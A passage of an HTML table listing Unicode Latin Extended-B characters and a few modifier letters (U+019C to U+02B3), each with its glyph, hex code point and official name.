<td style="text-align:center">LATIN CAPITAL LETTER TURNED M</td>
</tr>
<tr>
<td style="text-align:center">Ɲ</td>
<td style="text-align:center">019D</td>
<td style="text-align:center">LATIN CAPITAL LETTER N WITH LEFT HOOK</td>
</tr>
<tr>
<td style="text-align:center">ƞ</td>
<td style="text-align:center">019E</td>
<td style="text-align:center">LATIN SMALL LETTER N WITH LONG RIGHT LEG</td>
</tr>
<tr>
<td style="text-align:center">Ɵ</td>
<td style="text-align:center">019F</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH MIDDLE TILDE</td>
</tr>
<tr>
<td style="text-align:center">Ơ</td>
<td style="text-align:center">01A0</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH HORN</td>
</tr>
<tr>
<td style="text-align:center">ơ</td>
<td style="text-align:center">01A1</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH HORN</td>
</tr>
<tr>
<td style="text-align:center">Ƣ</td>
<td style="text-align:center">01A2</td>
<td style="text-align:center">LATIN CAPITAL LETTER OI</td>
</tr>
<tr>
<td style="text-align:center">ƣ</td>
<td style="text-align:center">01A3</td>
<td style="text-align:center">LATIN SMALL LETTER OI</td>
</tr>
<tr>
<td style="text-align:center">Ƥ</td>
<td style="text-align:center">01A4</td>
<td style="text-align:center">LATIN CAPITAL LETTER P WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ƥ</td>
<td style="text-align:center">01A5</td>
<td style="text-align:center">LATIN SMALL LETTER P WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ʀ</td>
<td style="text-align:center">01A6</td>
<td style="text-align:center">LATIN LETTER YR</td>
</tr>
<tr>
<td style="text-align:center">Ƨ</td>
<td style="text-align:center">01A7</td>
<td style="text-align:center">LATIN CAPITAL LETTER TONE TWO</td>
</tr>
<tr>
<td style="text-align:center">ƨ</td>
<td style="text-align:center">01A8</td>
<td style="text-align:center">LATIN SMALL LETTER TONE TWO</td>
</tr>
<tr>
<td style="text-align:center">Ʃ</td>
<td style="text-align:center">01A9</td>
<td style="text-align:center">LATIN CAPITAL LETTER ESH</td>
</tr>
<tr>
<td style="text-align:center">ƪ</td>
<td style="text-align:center">01AA</td>
<td style="text-align:center">LATIN LETTER REVERSED ESH LOOP</td>
</tr>
<tr>
<td style="text-align:center">ƫ</td>
<td style="text-align:center">01AB</td>
<td style="text-align:center">LATIN SMALL LETTER T WITH PALATAL HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ƭ</td>
<td style="text-align:center">01AC</td>
<td style="text-align:center">LATIN CAPITAL LETTER T WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ƭ</td>
<td style="text-align:center">01AD</td>
<td style="text-align:center">LATIN SMALL LETTER T WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ʈ</td>
<td style="text-align:center">01AE</td>
<td style="text-align:center">LATIN CAPITAL LETTER T WITH RETROFLEX HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ư</td>
<td style="text-align:center">01AF</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH HORN</td>
</tr>
<tr>
<td style="text-align:center">ư</td>
<td style="text-align:center">01B0</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH HORN</td>
</tr>
<tr>
<td style="text-align:center">Ʊ</td>
<td style="text-align:center">01B1</td>
<td style="text-align:center">LATIN CAPITAL LETTER UPSILON</td>
</tr>
<tr>
<td style="text-align:center">Ʋ</td>
<td style="text-align:center">01B2</td>
<td style="text-align:center">LATIN CAPITAL LETTER V WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ƴ</td>
<td style="text-align:center">01B3</td>
<td style="text-align:center">LATIN CAPITAL LETTER Y WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ƴ</td>
<td style="text-align:center">01B4</td>
<td style="text-align:center">LATIN SMALL LETTER Y WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ƶ</td>
<td style="text-align:center">01B5</td>
<td style="text-align:center">LATIN CAPITAL LETTER Z WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ƶ</td>
<td style="text-align:center">01B6</td>
<td style="text-align:center">LATIN SMALL LETTER Z WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ʒ</td>
<td style="text-align:center">01B7</td>
<td style="text-align:center">LATIN CAPITAL LETTER EZH</td>
</tr>
<tr>
<td style="text-align:center">Ƹ</td>
<td style="text-align:center">01B8</td>
<td style="text-align:center">LATIN CAPITAL LETTER EZH REVERSED</td>
</tr>
<tr>
<td style="text-align:center">ƹ</td>
<td style="text-align:center">01B9</td>
<td style="text-align:center">LATIN SMALL LETTER EZH REVERSED</td>
</tr>
<tr>
<td style="text-align:center">ƺ</td>
<td style="text-align:center">01BA</td>
<td style="text-align:center">LATIN SMALL LETTER EZH WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">ƻ</td>
<td style="text-align:center">01BB</td>
<td style="text-align:center">LATIN LETTER TWO WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ƽ</td>
<td style="text-align:center">01BC</td>
<td style="text-align:center">LATIN CAPITAL LETTER TONE FIVE</td>
</tr>
<tr>
<td style="text-align:center">ƽ</td>
<td style="text-align:center">01BD</td>
<td style="text-align:center">LATIN SMALL LETTER TONE FIVE</td>
</tr>
<tr>
<td style="text-align:center">ƾ</td>
<td style="text-align:center">01BE</td>
<td style="text-align:center">LATIN LETTER INVERTED GLOTTAL STOP WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ƿ</td>
<td style="text-align:center">01BF</td>
<td style="text-align:center">LATIN LETTER WYNN</td>
</tr>
<tr>
<td style="text-align:center">ǀ</td>
<td style="text-align:center">01C0</td>
<td style="text-align:center">LATIN LETTER DENTAL CLICK</td>
</tr>
<tr>
<td style="text-align:center">ǁ</td>
<td style="text-align:center">01C1</td>
<td style="text-align:center">LATIN LETTER LATERAL CLICK</td>
</tr>
<tr>
<td style="text-align:center">ǂ</td>
<td style="text-align:center">01C2</td>
<td style="text-align:center">LATIN LETTER ALVEOLAR CLICK</td>
</tr>
<tr>
<td style="text-align:center">ǃ</td>
<td style="text-align:center">01C3</td>
<td style="text-align:center">LATIN LETTER RETROFLEX CLICK</td>
</tr>
<tr>
<td style="text-align:center">Ǆ</td>
<td style="text-align:center">01C4</td>
<td style="text-align:center">LATIN CAPITAL LETTER DZ WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǅ</td>
<td style="text-align:center">01C5</td>
<td style="text-align:center">LATIN CAPITAL LETTER D WITH SMALL LETTER Z WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǆ</td>
<td style="text-align:center">01C6</td>
<td style="text-align:center">LATIN SMALL LETTER DZ WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǉ</td>
<td style="text-align:center">01C7</td>
<td style="text-align:center">LATIN CAPITAL LETTER LJ</td>
</tr>
<tr>
<td style="text-align:center">ǈ</td>
<td style="text-align:center">01C8</td>
<td style="text-align:center">LATIN CAPITAL LETTER L WITH SMALL LETTER J</td>
</tr>
<tr>
<td style="text-align:center">ǉ</td>
<td style="text-align:center">01C9</td>
<td style="text-align:center">LATIN SMALL LETTER LJ</td>
</tr>
<tr>
<td style="text-align:center">Ǌ</td>
<td style="text-align:center">01CA</td>
<td style="text-align:center">LATIN CAPITAL LETTER NJ</td>
</tr>
<tr>
<td style="text-align:center">ǋ</td>
<td style="text-align:center">01CB</td>
<td style="text-align:center">LATIN CAPITAL LETTER N WITH SMALL LETTER J</td>
</tr>
<tr>
<td style="text-align:center">ǌ</td>
<td style="text-align:center">01CC</td>
<td style="text-align:center">LATIN SMALL LETTER NJ</td>
</tr>
<tr>
<td style="text-align:center">Ǎ</td>
<td style="text-align:center">01CD</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǎ</td>
<td style="text-align:center">01CE</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǐ</td>
<td style="text-align:center">01CF</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǐ</td>
<td style="text-align:center">01D0</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǒ</td>
<td style="text-align:center">01D1</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǒ</td>
<td style="text-align:center">01D2</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǔ</td>
<td style="text-align:center">01D3</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǔ</td>
<td style="text-align:center">01D4</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǖ</td>
<td style="text-align:center">01D5</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH DIAERESIS AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">ǖ</td>
<td style="text-align:center">01D6</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH DIAERESIS AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ǘ</td>
<td style="text-align:center">01D7</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH DIAERESIS AND ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ǘ</td>
<td style="text-align:center">01D8</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH DIAERESIS AND ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ǚ</td>
<td style="text-align:center">01D9</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH DIAERESIS AND CARON</td>
</tr>
<tr>
<td style="text-align:center">ǚ</td>
<td style="text-align:center">01DA</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH DIAERESIS AND CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǜ</td>
<td style="text-align:center">01DB</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH DIAERESIS AND GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ǜ</td>
<td style="text-align:center">01DC</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH DIAERESIS AND GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ǝ</td>
<td style="text-align:center">01DD</td>
<td style="text-align:center">LATIN SMALL LETTER TURNED E</td>
</tr>
<tr>
<td style="text-align:center">Ǟ</td>
<td style="text-align:center">01DE</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH DIAERESIS AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">ǟ</td>
<td style="text-align:center">01DF</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH DIAERESIS AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ǡ</td>
<td style="text-align:center">01E0</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH DOT ABOVE AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">ǡ</td>
<td style="text-align:center">01E1</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH DOT ABOVE AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ǣ</td>
<td style="text-align:center">01E2</td>
<td style="text-align:center">LATIN CAPITAL LETTER AE WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ǣ</td>
<td style="text-align:center">01E3</td>
<td style="text-align:center">LATIN SMALL LETTER AE WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ǥ</td>
<td style="text-align:center">01E4</td>
<td style="text-align:center">LATIN CAPITAL LETTER G WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ǥ</td>
<td style="text-align:center">01E5</td>
<td style="text-align:center">LATIN SMALL LETTER G WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ǧ</td>
<td style="text-align:center">01E6</td>
<td style="text-align:center">LATIN CAPITAL LETTER G WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǧ</td>
<td style="text-align:center">01E7</td>
<td style="text-align:center">LATIN SMALL LETTER G WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǩ</td>
<td style="text-align:center">01E8</td>
<td style="text-align:center">LATIN CAPITAL LETTER K WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǩ</td>
<td style="text-align:center">01E9</td>
<td style="text-align:center">LATIN SMALL LETTER K WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǫ</td>
<td style="text-align:center">01EA</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">ǫ</td>
<td style="text-align:center">01EB</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">Ǭ</td>
<td style="text-align:center">01EC</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH OGONEK AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">ǭ</td>
<td style="text-align:center">01ED</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH OGONEK AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ǯ</td>
<td style="text-align:center">01EE</td>
<td style="text-align:center">LATIN CAPITAL LETTER EZH WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǯ</td>
<td style="text-align:center">01EF</td>
<td style="text-align:center">LATIN SMALL LETTER EZH WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ǰ</td>
<td style="text-align:center">01F0</td>
<td style="text-align:center">LATIN SMALL LETTER J WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ǳ</td>
<td style="text-align:center">01F1</td>
<td style="text-align:center">LATIN CAPITAL LETTER DZ</td>
</tr>
<tr>
<td style="text-align:center">ǲ</td>
<td style="text-align:center">01F2</td>
<td style="text-align:center">LATIN CAPITAL LETTER D WITH SMALL LETTER Z</td>
</tr>
<tr>
<td style="text-align:center">ǳ</td>
<td style="text-align:center">01F3</td>
<td style="text-align:center">LATIN SMALL LETTER DZ</td>
</tr>
<tr>
<td style="text-align:center">Ǵ</td>
<td style="text-align:center">01F4</td>
<td style="text-align:center">LATIN CAPITAL LETTER G WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ǵ</td>
<td style="text-align:center">01F5</td>
<td style="text-align:center">LATIN SMALL LETTER G WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ƕ</td>
<td style="text-align:center">01F6</td>
<td style="text-align:center">LATIN CAPITAL LETTER HWAIR</td>
</tr>
<tr>
<td style="text-align:center">Ƿ</td>
<td style="text-align:center">01F7</td>
<td style="text-align:center">LATIN CAPITAL LETTER WYNN</td>
</tr>
<tr>
<td style="text-align:center">Ǹ</td>
<td style="text-align:center">01F8</td>
<td style="text-align:center">LATIN CAPITAL LETTER N WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ǹ</td>
<td style="text-align:center">01F9</td>
<td style="text-align:center">LATIN SMALL LETTER N WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ǻ</td>
<td style="text-align:center">01FA</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH RING ABOVE AND ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ǻ</td>
<td style="text-align:center">01FB</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH RING ABOVE AND ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ǽ</td>
<td style="text-align:center">01FC</td>
<td style="text-align:center">LATIN CAPITAL LETTER AE WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ǽ</td>
<td style="text-align:center">01FD</td>
<td style="text-align:center">LATIN SMALL LETTER AE WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ǿ</td>
<td style="text-align:center">01FE</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH STROKE AND ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ǿ</td>
<td style="text-align:center">01FF</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH STROKE AND ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ȁ</td>
<td style="text-align:center">0200</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ȁ</td>
<td style="text-align:center">0201</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ȃ</td>
<td style="text-align:center">0202</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">ȃ</td>
<td style="text-align:center">0203</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ȅ</td>
<td style="text-align:center">0204</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ȅ</td>
<td style="text-align:center">0205</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ȇ</td>
<td style="text-align:center">0206</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">ȇ</td>
<td style="text-align:center">0207</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ȉ</td>
<td style="text-align:center">0208</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ȉ</td>
<td style="text-align:center">0209</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ȋ</td>
<td style="text-align:center">020A</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">ȋ</td>
<td style="text-align:center">020B</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ȍ</td>
<td style="text-align:center">020C</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ȍ</td>
<td style="text-align:center">020D</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ȏ</td>
<td style="text-align:center">020E</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">ȏ</td>
<td style="text-align:center">020F</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ȑ</td>
<td style="text-align:center">0210</td>
<td style="text-align:center">LATIN CAPITAL LETTER R WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ȑ</td>
<td style="text-align:center">0211</td>
<td style="text-align:center">LATIN SMALL LETTER R WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ȓ</td>
<td style="text-align:center">0212</td>
<td style="text-align:center">LATIN CAPITAL LETTER R WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">ȓ</td>
<td style="text-align:center">0213</td>
<td style="text-align:center">LATIN SMALL LETTER R WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ȕ</td>
<td style="text-align:center">0214</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ȕ</td>
<td style="text-align:center">0215</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH DOUBLE GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ȗ</td>
<td style="text-align:center">0216</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">ȗ</td>
<td style="text-align:center">0217</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH INVERTED BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ș</td>
<td style="text-align:center">0218</td>
<td style="text-align:center">LATIN CAPITAL LETTER S WITH COMMA BELOW</td>
</tr>
<tr>
<td style="text-align:center">ș</td>
<td style="text-align:center">0219</td>
<td style="text-align:center">LATIN SMALL LETTER S WITH COMMA BELOW</td>
</tr>
<tr>
<td style="text-align:center">Ț</td>
<td style="text-align:center">021A</td>
<td style="text-align:center">LATIN CAPITAL LETTER T WITH COMMA BELOW</td>
</tr>
<tr>
<td style="text-align:center">ț</td>
<td style="text-align:center">021B</td>
<td style="text-align:center">LATIN SMALL LETTER T WITH COMMA BELOW</td>
</tr>
<tr>
<td style="text-align:center">Ȝ</td>
<td style="text-align:center">021C</td>
<td style="text-align:center">LATIN CAPITAL LETTER YOGH</td>
</tr>
<tr>
<td style="text-align:center">ȝ</td>
<td style="text-align:center">021D</td>
<td style="text-align:center">LATIN SMALL LETTER YOGH</td>
</tr>
<tr>
<td style="text-align:center">Ȟ</td>
<td style="text-align:center">021E</td>
<td style="text-align:center">LATIN CAPITAL LETTER H WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ȟ</td>
<td style="text-align:center">021F</td>
<td style="text-align:center">LATIN SMALL LETTER H WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ƞ</td>
<td style="text-align:center">0220</td>
<td style="text-align:center">LATIN CAPITAL LETTER N WITH LONG RIGHT LEG</td>
</tr>
<tr>
<td style="text-align:center">ȡ</td>
<td style="text-align:center">0221</td>
<td style="text-align:center">LATIN SMALL LETTER D WITH CURL</td>
</tr>
<tr>
<td style="text-align:center">Ȣ</td>
<td style="text-align:center">0222</td>
<td style="text-align:center">LATIN CAPITAL LETTER OU</td>
</tr>
<tr>
<td style="text-align:center">ȣ</td>
<td style="text-align:center">0223</td>
<td style="text-align:center">LATIN SMALL LETTER OU</td>
</tr>
<tr>
<td style="text-align:center">Ȥ</td>
<td style="text-align:center">0224</td>
<td style="text-align:center">LATIN CAPITAL LETTER Z WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ȥ</td>
<td style="text-align:center">0225</td>
<td style="text-align:center">LATIN SMALL LETTER Z WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ȧ</td>
<td style="text-align:center">0226</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ȧ</td>
<td style="text-align:center">0227</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">Ȩ</td>
<td style="text-align:center">0228</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ȩ</td>
<td style="text-align:center">0229</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">Ȫ</td>
<td style="text-align:center">022A</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH DIAERESIS AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">ȫ</td>
<td style="text-align:center">022B</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH DIAERESIS AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ȭ</td>
<td style="text-align:center">022C</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH TILDE AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">ȭ</td>
<td style="text-align:center">022D</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH TILDE AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ȯ</td>
<td style="text-align:center">022E</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ȯ</td>
<td style="text-align:center">022F</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">Ȱ</td>
<td style="text-align:center">0230</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH DOT ABOVE AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">ȱ</td>
<td style="text-align:center">0231</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH DOT ABOVE AND MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ȳ</td>
<td style="text-align:center">0232</td>
<td style="text-align:center">LATIN CAPITAL LETTER Y WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ȳ</td>
<td style="text-align:center">0233</td>
<td style="text-align:center">LATIN SMALL LETTER Y WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ȴ</td>
<td style="text-align:center">0234</td>
<td style="text-align:center">LATIN SMALL LETTER L WITH CURL</td>
</tr>
<tr>
<td style="text-align:center">ȵ</td>
<td style="text-align:center">0235</td>
<td style="text-align:center">LATIN SMALL LETTER N WITH CURL</td>
</tr>
<tr>
<td style="text-align:center">ȶ</td>
<td style="text-align:center">0236</td>
<td style="text-align:center">LATIN SMALL LETTER T WITH CURL</td>
</tr>
<tr>
<td style="text-align:center">ȷ</td>
<td style="text-align:center">0237</td>
<td style="text-align:center">LATIN SMALL LETTER DOTLESS J</td>
</tr>
<tr>
<td style="text-align:center">ȸ</td>
<td style="text-align:center">0238</td>
<td style="text-align:center">LATIN SMALL LETTER DB DIGRAPH</td>
</tr>
<tr>
<td style="text-align:center">ȹ</td>
<td style="text-align:center">0239</td>
<td style="text-align:center">LATIN SMALL LETTER QP DIGRAPH</td>
</tr>
<tr>
<td style="text-align:center">Ⱥ</td>
<td style="text-align:center">023A</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ȼ</td>
<td style="text-align:center">023B</td>
<td style="text-align:center">LATIN CAPITAL LETTER C WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ȼ</td>
<td style="text-align:center">023C</td>
<td style="text-align:center">LATIN SMALL LETTER C WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ƚ</td>
<td style="text-align:center">023D</td>
<td style="text-align:center">LATIN CAPITAL LETTER L WITH BAR</td>
</tr>
<tr>
<td style="text-align:center">Ⱦ</td>
<td style="text-align:center">023E</td>
<td style="text-align:center">LATIN CAPITAL LETTER T WITH DIAGONAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">ȿ</td>
<td style="text-align:center">023F</td>
<td style="text-align:center">LATIN SMALL LETTER S WITH SWASH TAIL</td>
</tr>
<tr>
<td style="text-align:center">ɀ</td>
<td style="text-align:center">0240</td>
<td style="text-align:center">LATIN SMALL LETTER Z WITH SWASH TAIL</td>
</tr>
<tr>
<td style="text-align:center">Ɂ</td>
<td style="text-align:center">0241</td>
<td style="text-align:center">LATIN CAPITAL LETTER GLOTTAL STOP</td>
</tr>
<tr>
<td style="text-align:center">ɂ</td>
<td style="text-align:center">0242</td>
<td style="text-align:center">LATIN SMALL LETTER GLOTTAL STOP</td>
</tr>
<tr>
<td style="text-align:center">Ƀ</td>
<td style="text-align:center">0243</td>
<td style="text-align:center">LATIN CAPITAL LETTER B WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ʉ</td>
<td style="text-align:center">0244</td>
<td style="text-align:center">LATIN CAPITAL LETTER U BAR</td>
</tr>
<tr>
<td style="text-align:center">Ʌ</td>
<td style="text-align:center">0245</td>
<td style="text-align:center">LATIN CAPITAL LETTER TURNED V</td>
</tr>
<tr>
<td style="text-align:center">Ɇ</td>
<td style="text-align:center">0246</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ɇ</td>
<td style="text-align:center">0247</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ɉ</td>
<td style="text-align:center">0248</td>
<td style="text-align:center">LATIN CAPITAL LETTER J WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ɉ</td>
<td style="text-align:center">0249</td>
<td style="text-align:center">LATIN SMALL LETTER J WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ɋ</td>
<td style="text-align:center">024A</td>
<td style="text-align:center">LATIN CAPITAL LETTER SMALL Q WITH HOOK TAIL</td>
</tr>
<tr>
<td style="text-align:center">ɋ</td>
<td style="text-align:center">024B</td>
<td style="text-align:center">LATIN SMALL LETTER Q WITH HOOK TAIL</td>
</tr>
<tr>
<td style="text-align:center">Ɍ</td>
<td style="text-align:center">024C</td>
<td style="text-align:center">LATIN CAPITAL LETTER R WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ɍ</td>
<td style="text-align:center">024D</td>
<td style="text-align:center">LATIN SMALL LETTER R WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ɏ</td>
<td style="text-align:center">024E</td>
<td style="text-align:center">LATIN CAPITAL LETTER Y WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ɏ</td>
<td style="text-align:center">024F</td>
<td style="text-align:center">LATIN SMALL LETTER Y WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ʰ</td>
<td style="text-align:center">02B0</td>
<td style="text-align:center">MODIFIER LETTER SMALL H</td>
</tr>
<tr>
<td style="text-align:center">ʱ</td>
<td style="text-align:center">02B1</td>
<td style="text-align:center">MODIFIER LETTER SMALL H WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ʲ</td>
<td style="text-align:center">02B2</td>
<td style="text-align:center">MODIFIER LETTER SMALL J</td>
</tr>
<tr>
<td style="text-align:center">ʳ</td>
<td style="text-align:center">02B3</td>
